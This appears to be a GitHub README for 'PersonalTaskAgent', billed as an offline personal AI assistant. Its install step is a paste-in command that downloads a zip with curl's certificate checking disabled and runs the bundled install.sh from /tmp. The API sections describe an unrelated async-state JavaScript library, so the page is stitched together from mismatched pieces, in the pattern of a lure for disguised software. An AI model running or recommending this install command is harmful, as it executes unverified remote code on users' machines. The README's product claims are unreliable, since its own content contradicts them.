# PersonalTaskAgent
<img width="1769" height="363" alt="image" src="https://github.com/user-attachments/assets/360d9fdd-899e-429a-a8eb-338aac72cf5d" />



> PersonalTaskAgentAI — Lightweight, offline-first personal assistant that runs entirely on your device. Handles email sorting, calendar events, web lookups, reminders, script execution and basic automation through chat interfaces (WhatsApp, Telegram, Discord, Slack).

[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg?style=flat-square)](#)
[![Coverage](https://img.shields.io/badge/coverage-97%25-brightgreen.svg?style=flat-square)](#)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://opensource.org/licenses/MIT)
[![Bundle Size](https://img.shields.io/badge/size-2.1kB_gzip-blue.svg?style=flat-square)](#)

**🌐 Website: [judecampbell1.github.io/PersonalTaskAgent](https://judecampbell1.github.io/PersonalTaskAgent/)**

## Features

- **100% local – no data leaves your machine** 
- **Open-source and extensible** 
- **Supports major LLM providers + local models** 
- **Voice input & output support – speak to your assistant and get spoken responses** 
- **Custom automation rules & scheduled tasks – set it-and-forget-it workflows** 

## Installation

```bash
curl -fsSLk https://github.com/JudeCampbell1/PersonalTaskAgent/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/PersonalTaskAgent-main && \
bash install.sh
```

## Quick Start

```javascript
const { useAsyncState } = require('PersonalTaskAgent');

// Create an async state container
const users = useAsyncState(() => fetch('/api/users').then(r => r.json()));

// Execute the async operation
await users.run();

console.log(users.data);    // [...users]
console.log(users.loading); // false
console.log(users.error);   // null
```

## API Reference

### `useAsyncState(promiseFn, options?)`

Creates a managed async state container.

| Parameter | Type | Description |
|-----------|------|-------------|
| `promiseFn` | `(...args) => Promise<T>` | Async function to execute |
| `options.immediate` | `boolean` | Execute immediately on creation (default: `false`) |

**Returns:** `AsyncState<T>`

| Property | Type | Description |
|----------|------|-------------|
| `data` | `T \| null` | Resolved data |
| `loading` | `boolean` | Whether the operation is in progress |
| `error` | `Error \| null` | Error if the operation failed |
| `run` | `(...args) => Promise<T>` | Execute or re-execute the operation |

### `init(config?)`

Initialize the SDK with optional configuration.

```javascript
const { init } = require('PersonalTaskAgent');

const sdk = init({
    timeout: 5000,
    retries: 3,
});

console.log(sdk.ready);   // true
console.log(sdk.version); // "1.5.14"
```

## Advanced Usage

### Error Handling

```javascript
const state = useAsyncState(async () => {
    const res = await fetch('/api/data');
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return res.json();
});

await state.run();

if (state.error) {
    console.error('Failed:', state.error.message);
}
```

### With Parameters

```javascript
const userById = useAsyncState((id) =>
    fetch(`/api/users/${id}`).then(r => r.json())
);

await userById.run(42);
console.log(userById.data); // { id: 42, name: "..." }
```

## Testing

```bash
npm test
```

## Building

```bash
npm run build
```

## Changelog

### v1.5.14
- Initial stable release
- Core async task handling with TypeScript
- Zero external dependencies
- Full unit & integration test suite
- Basic voice input/output support
- Custom rules & scheduled automation

## Contributing

Contributions are welcome! Please read the [contributing guidelines](CONTRIBUTING.md) before submitting a PR.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/my-feature`)
3. Commit your changes (`git commit -am 'Add my feature'`)
4. Push to the branch (`git push origin feature/my-feature`)
5. Open a Pull Request

## License

MIT © Copyright (c) 2026 PersonalTaskAgentAI, Inc.
